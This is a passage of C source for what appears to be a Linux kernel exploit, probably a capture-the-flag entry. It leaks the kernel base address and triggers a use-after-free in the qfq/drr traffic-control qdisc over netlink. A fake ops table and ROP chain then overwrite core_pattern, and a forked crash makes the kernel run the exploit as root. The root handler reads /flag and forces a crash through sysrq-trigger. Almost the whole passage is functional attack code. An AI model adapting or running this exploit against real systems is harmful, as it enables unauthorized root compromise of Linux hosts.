#define QDISC_CLASS_OPS_OFFS_FIND 40
    char *fake_cl_ops = (char *)&kernfs_data[KERNFS_FAKE_CL_OPS_OFFSET];
    *(size_t *)&fake_cl_ops[QDISC_CLASS_OPS_OFFS_FIND] = validate_kernfs_val(LEAVE); // ->find

    // after pivoting stack, we land at cl_ops+8. since we have stuff at cl_ops+40, we'll just pop till after that to clean up the exploit
    *(size_t *)&fake_cl_ops[8] = validate_kernfs_val(POP_RET);
    *(size_t *)&fake_cl_ops[8 * 3] = validate_kernfs_val(POP2_RET);

    // we are now at cl_ops[6]. there is approx 399 bytes of buffer space to write the full ROP chain, which is more than enough
    size_t *rop = (size_t *)&fake_cl_ops[8 * 6];
    size_t x = 0;
    rop[x++] = validate_kernfs_val(POP_RDI);
    rop[x++] = validate_kernfs_val(CORE_PATTERN);

    // this offset is the offset of the core_pattern in the kernfs buffer.
    // we will append this at the end of the ROP chain
#define KERNFS_BUF_CORE_PATTERN_OFFSET 176

    // Since our payload location does not contain null bytes, we can use it directly.
    rop[x++] = validate_kernfs_val(POP_RSI);
    rop[x++] = validate_kernfs_val(KERNFS_ADDR + KERNFS_BUF_CORE_PATTERN_OFFSET);

    rop[x++] = validate_kernfs_val(STRCPY);

    // infinite loop - won't trigger irq crash :D
    rop[x++] = validate_kernfs_val(POP_RAX);
    rop[x++] = validate_kernfs_val(JMP_RAX);
    rop[x++] = validate_kernfs_val(JMP_RAX);

    // append core_pattern
    if (((size_t)&rop[x]) - (size_t)kernfs_data != KERNFS_BUF_CORE_PATTERN_OFFSET)
        fatal("Incorrect KERNFS_BUF_CORE_PATTERN_OFFSET");
    strcpy((char *)&rop[x], desired_core_pattern);

    send_kernfs_data();
}

void trigger_uaf(const int fd)
{
    puts("[+] triggering uaf");
    SYSOK(modify_qdisc_plug_unplug(fd, get_id("f1:0"), get_id("f0:2")));
}

void core_pattern_handler(char **argv)
{
    // #define SYS_pidfd_getfd 438
    int pid = strtoull(argv[1], 0, 10);
    int pfd = syscall(SYS_pidfd_open, pid, 0);
    int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
    int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
    int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
    dup2(stdinfd, 0);
    dup2(stdoutfd, 1);
    dup2(stderrfd, 2);
    /* Get flag. Can't poweroff because CPU 0 is in infinite loop, so crash out.*/
    system("cat /flag;sleep 1;echo c>/proc/sysrq-trigger");
    exit(0);
}

int main(int argc, char **argv)
{
    setvbuf(stdout, 0, 2, 0);
    if (argc > 1)
    {
        core_pattern_handler(argv);
    }

    g_kernel_base = kaslr_leak();
    printf("[>] Kernel base address: 0x%lx\n", g_kernel_base);

    if (geteuid() != 0)
        setup_userns();

    set_cpu(0); // main exploit thread runs on CPU 0. others will run on CPU 1.

    if (fork() == 0) // this process is used to trigger core_pattern exploit
    {
        set_cpu(1);
        crash();
        exit(EXIT_SUCCESS);
    }

    const int netlink_fd = netlink_open(NETLINK_ROUTE);
    if (netlink_fd < 0)
    {
        fprintf(stderr, "Failed to open Netlink socket.\n");
        return EXIT_FAILURE;
    }

    SYSOK(set_interface_up(netlink_fd, "lo"));

    // setup another device to use for reclaiming the UAF qfq class subsequently
    setup_reclaim_qfq_class(netlink_fd);

    setup_root_hierachy(netlink_fd);
    setup_uaf(netlink_fd, get_id("f0:1")); // attach main subtree to root hierachy
    // At this point, the qfq class f0:1 is UAF. We can trigger peek on it later.

    // Reclaim it with drr_class struct.
    const size_t target_ops_addr = KERNFS_ADDR;
    do_reclaim_qfq_class(netlink_fd, target_ops_addr);

    // Now, we have control over ops (points into KERNFS), when we trigger qfq_dequeue later, it will call ops->peek
    prepare_rop(); // prepare the ROP chain in kernfs_data

    trigger_uaf(netlink_fd);

    sleep(5); // wait for forked crash process to be triggered
    puts("done");
    return 0;
}